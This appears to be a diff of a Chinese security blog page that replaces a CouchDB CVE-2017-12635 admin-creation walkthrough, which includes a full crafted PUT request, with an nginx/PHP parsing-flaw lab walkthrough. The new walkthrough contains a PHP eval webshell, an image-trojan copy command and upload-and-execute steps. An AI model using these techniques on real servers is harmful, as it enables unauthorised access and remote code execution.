@@ -16,10 +16,15 @@
   
   
   
-    <meta name="description" content="CouchDB 未授权访问漏洞CVE-2017-12635
-漏洞原理：Apache CouchDB是一个开源数据库，专注于易用性和成为”完全拥抱web的数据库”。它是一个使用JSON作为存储格式，JavaScript作为查询语言，MapReduce和HTTP作为API的NoSQL数据库。应用广泛，如BBC用在其动态内容展示平台，Credit Suisse用在其内部的商品部门的市场框架，Mee...">
+    <meta name="description" content="版本信息：nginx 1.x最新版PHP 7.x最新版
+漏洞原理：Nginx中的解析漏洞是由于PHP配置错误导致的。由此可知，此漏洞与nginx和PHP无关，因为用户的配置不当造成的解析漏洞。&emsp;&emsp;
+漏洞复现：靶机：192.168.199.217&emsp;
+
+访问http://192.168.199.217/uploadfiles/nginx.png
+
+访问http://...">
   
-  <title>CouchDB 未授权访问漏洞CVE-2017-12635 [ liu ]</title>
+  <title>nginx文件解析漏洞 [ liu ]</title>
   
   
     <link rel="shortcut icon" href="/hollow.ico">
@@ -39,21 +44,21 @@
 <div class="side-navigate hide-area">
   
     <div class="item prev">
-      <a href="/2019/07/21/1 day/5/">
+      <a href="/2019/07/21/1 day/3/">
         <div class="item-icon"></div>
       </a>
       <div class="item-title">
-        nginx文件解析漏洞
+        CouchDB任意命令执行漏洞（CVE-2017-12636）
       </div>
     </div>
   
   
     <div class="item next">
-      <a href="/2019/07/20/1 day/1/">
+      <a href="/2019/07/20/1 day/2/">
         <div class="item-icon"></div>
       </a>
       <div class="item-title">
-        ActiveMQ反序列化漏洞（CVE-2015-5254）
+        CouchDB 未授权访问漏洞CVE-2017-12635
       </div>
     </div>
   
@@ -130,41 +135,42 @@
   
 
   <article id="post">
-    <h1>CouchDB 未授权访问漏洞CVE-2017-12635</h1>
+    <h1>nginx文件解析漏洞</h1>
     <p class="page-title-sub">
-      <span id="post-title-date">Created at 2019-07-20</span>
+      <span id="post-title-date">Created at 2019-07-21</span>
       
-        <span id="post-title-updated">Updated at 2019-07-21</span>
-      
-      
-      
-      <span id="post-title-tags">
-      Tag
+        <span id="post-title-updated">Updated at 2019-07-22</span>
       
       
-        
-        
-        <a href="/tags/CouchDB-未授权访问漏洞CVE-2017-12635/">CouchDB 未授权访问漏洞CVE-2017-12635</a>
-      
-      </span>
       
     </p>
     
-    <h1 id="CouchDB-未授权访问漏洞CVE-2017-12635"><a href="#CouchDB-未授权访问漏洞CVE-2017-12635" class="headerlink" title="CouchDB 未授权访问漏洞CVE-2017-12635"></a>CouchDB 未授权访问漏洞CVE-2017-12635</h1><hr>
-<h2 id="漏洞原理："><a href="#漏洞原理：" class="headerlink" title="漏洞原理："></a>漏洞原理：</h2><p>Apache CouchDB是一个开源数据库，专注于易用性和成为”完全拥抱web的数据库”。它是一个使用JSON作为存储格式，JavaScript作为查询语言，MapReduce和HTTP作为API的NoSQL数据库。应用广泛，如BBC用在其动态内容展示平台，Credit Suisse用在其内部的商品部门的市场框架，Meebo，用在其社交平台（web和应用程序）。<br>在2017年11月15日，CVE-2017-12635和CVE-2017-12636披露，CVE-2017-12635是由于Erlang和JavaScript对JSON解析方式的不同，导致语句执行产生差异性导致的。这个漏洞可以让任意用户创建管理员，属于垂直权限绕过漏洞。<br>&emsp;<br>影响版本：小于 1.7.0 以及 小于 2.1.1<br>&emsp;<br>&emsp;</p>
-<h2 id="漏洞复现："><a href="#漏洞复现：" class="headerlink" title="漏洞复现："></a>漏洞复现：</h2><p>靶机：192.168.199.217:5984<br>攻击者：192.168.199.187</p>
+    <hr>
+<p>版本信息：<br>nginx 1.x最新版<br>PHP 7.x最新版</p>
+<h2 id="漏洞原理："><a href="#漏洞原理：" class="headerlink" title="漏洞原理："></a>漏洞原理：</h2><p>Nginx中的解析漏洞是由于PHP配置错误导致的。由此可知，此漏洞与nginx和PHP无关，因为用户的配置不当造成的解析漏洞。<br>&emsp;<br>&emsp;</p>
+<h2 id="漏洞复现："><a href="#漏洞复现：" class="headerlink" title="漏洞复现："></a>漏洞复现：</h2><p>靶机：192.168.199.217<br>&emsp;</p>
 <ol>
-<li>首先访问一下靶机</li>
+<li>访问<a href="http://192.168.199.217/uploadfiles/nginx.png" target="_blank" rel="noopener">http://192.168.199.217/uploadfiles/nginx.png</a></li>
 </ol>
-<p><img src="https://note.youdao.com/yws/public/resource/8de016f049dfd295f1df4bb4be42a572/xmlnote/WEBRESOURCEf45c3400599f2f09e07226e216dcdb92/10574" alt><br>暴漏出couchdb的版本信息等<br>访问<a href="http://192.168.199.151:5984/_utils/" target="_blank" rel="noopener">http://192.168.199.151:5984/_utils/</a></p>
-<p><img src="https://note.youdao.com/yws/public/resource/8de016f049dfd295f1df4bb4be42a572/xmlnote/WEBRESOURCE98552849765d2332f033736b4f986735/10536" alt><br>选择登陆账户：admin，密码：password<br>登陆进去可以看到别人创建的用户密码等数据库<br>&emsp;<br>&emsp;</p>
+<p><img src="https://note.youdao.com/yws/public/resource/8082bcd99647943dd23e2d40ac360801/xmlnote/WEBRESOURCE7e34837db9940339982ff75e377ec4ba/12010" alt><br>访问<a href="http://192.168.199.217/uploadfiles/nginx.png/.php" target="_blank" rel="noopener">http://192.168.199.217/uploadfiles/nginx.png/.php</a><br>在nginx.php后面加上/.php，发现被解析成了PHP文件</p>
+<p><img src="https://note.youdao.com/yws/public/resource/8082bcd99647943dd23e2d40ac360801/xmlnote/WEBRESOURCE74f35e206cac35b1d5ce1902c5a1083d/12014" alt><br>因此可以判断出在图片后面加上/.php就可以解析成PHP文件。<br>可以利用这个解析漏洞，上传图片木马，再通过此方式进行解析</p>
 <ol start="2">
-<li>使用burpsuite进行抓包并修改请求内容</li>
+<li>首先，生成一个图片木马<br>准备一张2.png的图片<br>一句话木马（命名为2.php）<?php @eval($_POST[nima]);?><br>在Windows上使用copy命令进行制作图片木马。<br>copy 2.png/b+2.php/a 3.png（生成的图片马的名字为3.png）</li>
 </ol>
-<p><img src="https://note.youdao.com/yws/public/resource/8de016f049dfd295f1df4bb4be42a572/xmlnote/WEBRESOURCE2862a7c922ecf79ad78aef5d3794b79d/10540" alt><br>修改请求为PUT并创建用户和密码，在user这个数据库中创建账号和密码<br>PUT /_users/org.couchdb.user:liupanpan HTTP/1.1<br>Host: 192.168.199.217:5984<br>Cache-Control: max-age=0<br>Upgrade-Insecure-Requests: 1<br>User-Agent: Mozilla/5.0 (Macintosh; Intel Mac OS X 10_14_5) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/75.0.3770.142 Safari/537.36<br>Accept: text/html,application/xhtml+xml,application/xml;q=0.9,image/webp,image/apng,<em>/</em>;q=0.8,application/signed-exchange;v=b3<br>Accept-Encoding: gzip, deflate<br>Accept-Language: zh-CN,zh;q=0.9<br>If-Modified-Since: Sat, 02 Dec 2017 17:49:09 GMT<br>Connection: close<br>Content-Length: 108</p>
-<p>{<br>  “type”: “user”,<br>  “name”: “liupanpan”,<br>  “roles”: [“_admin”],<br>  “roles”: [],<br>  “password”: “lpp”<br>}</p>
-<p><img src="https://note.youdao.com/yws/public/resource/8de016f049dfd295f1df4bb4be42a572/xmlnote/WEBRESOURCEcd68ce1dc7a7c6f634e2f878eb78bd36/10559" alt><br>&emsp;<br>访问下图页面</p>
-<p><img src="https://note.youdao.com/yws/public/resource/8de016f049dfd295f1df4bb4be42a572/xmlnote/WEBRESOURCEb3ea1d14224d390a775ea0c7e872977c/10562" alt><br>发现创建成功<br>&emsp;<br>&emsp;</p>
+<p>&emsp;<br>&emsp;</p>
+<ol start="3">
+<li>上传图片马<br>直接访问192.168.199.217</li>
+</ol>
+<p><img src="https://note.youdao.com/yws/public/resource/8082bcd99647943dd23e2d40ac360801/xmlnote/WEBRESOURCE6e0c4d0e1c30140e457edff871fec2e3/12002" alt><br>选择3.png直接点击上传。<br><img src="https://note.youdao.com/yws/public/resource/8082bcd99647943dd23e2d40ac360801/xmlnote/WEBRESOURCEdc689c00dbfbc5869cc3d19794642109/12037" alt><br>上传成功，并且爆出上传路径。<br>直接访问<a href="http://192.168.199.217/uploadfiles/10fb15c77258a991b0028080a64fb42d.png" target="_blank" rel="noopener">http://192.168.199.217/uploadfiles/10fb15c77258a991b0028080a64fb42d.png</a></p>
+<p><img src="https://note.youdao.com/yws/public/resource/8082bcd99647943dd23e2d40ac360801/xmlnote/WEBRESOURCE26c9e09a65fa4a20408357303542a883/12040" alt><br>可以正常显示出上传的图片，表示上传成功。<br>&emsp;<br>&emsp;</p>
+<ol start="4">
+<li>对3.png解析为PHP<br>直接在<a href="http://192.168.199.217/uploadfiles/10fb15c77258a991b0028080a64fb42d.png后面加上/.php即可解析为PHP文件。" target="_blank" rel="noopener">http://192.168.199.217/uploadfiles/10fb15c77258a991b0028080a64fb42d.png后面加上/.php即可解析为PHP文件。</a><br>访问：<br><a href="http://192.168.199.217/uploadfiles/10fb15c77258a991b0028080a64fb42d.png/.php" target="_blank" rel="noopener">http://192.168.199.217/uploadfiles/10fb15c77258a991b0028080a64fb42d.png/.php</a></li>
+</ol>
+<p><img src="https://note.youdao.com/yws/public/resource/8082bcd99647943dd23e2d40ac360801/xmlnote/WEBRESOURCE7e52c87888c9fa16d3a0ec4e4870ab95/12046" alt><br>说明解析成功。<br>&emsp;<br>&emsp;</p>
+<ol start="5">
+<li>使用蚁剑进行连接</li>
+</ol>
+<p><img src="https://note.youdao.com/yws/public/resource/8082bcd99647943dd23e2d40ac360801/xmlnote/WEBRESOURCE6803540ee5f59b00016f3622621b07ad/12049" alt><br><img src="https://note.youdao.com/yws/public/resource/8082bcd99647943dd23e2d40ac360801/xmlnote/WEBRESOURCE3c3069b4f652ed40b79d27dedd03b93f/12051" alt><br><img src="https://note.youdao.com/yws/public/resource/8082bcd99647943dd23e2d40ac360801/xmlnote/WEBRESOURCEcdc3f64c4203b2b39b055683f025d207/12053" alt></p>
 
   </article>
   <div class="random-toc-area">
@@ -172,20 +178,20 @@
   <button class="btn-hide-toc btn-hide-toc-hide" onclick="TOCToggle()">Hide TOC</button>
   <div class="random-toc">
     <h2>Table of Content</h2>
-    <ol class="toc"><li class="toc-item toc-level-1"><a class="toc-link" href="#CouchDB-未授权访问漏洞CVE-2017-12635"><span class="toc-text">CouchDB 未授权访问漏洞CVE-2017-12635</span></a><ol class="toc-child"><li class="toc-item toc-level-2"><a class="toc-link" href="#漏洞原理："><span class="toc-text">漏洞原理：</span></a></li><li class="toc-item toc-level-2"><a class="toc-link" href="#漏洞复现："><span class="toc-text">漏洞复现：</span></a></li></ol></li></ol>
+    <ol class="toc"><li class="toc-item toc-level-2"><a class="toc-link" href="#漏洞原理："><span class="toc-text">漏洞原理：</span></a></li><li class="toc-item toc-level-2"><a class="toc-link" href="#漏洞复现："><span class="toc-text">漏洞复现：</span></a></li></ol>
   </div>
 </div>
 
   
 <nav id="pagination">
   
-    <a href="/2019/07/21/1 day/5/" class="prev">&larr; Prev post nginx文件解析漏洞</a>
+    <a href="/2019/07/21/1 day/3/" class="prev">&larr; Prev post CouchDB任意命令执行漏洞（CVE-2017-12636）</a>
   
 
   
 
   
-    <a href="/2019/07/20/1 day/1/" class="next">Next post ActiveMQ反序列化漏洞（CVE-2015-5254） &rarr;</a>
+    <a href="/2019/07/20/1 day/2/" class="next">Next post CouchDB 未授权访问漏洞CVE-2017-12635 &rarr;</a>
   
 </nav>
 
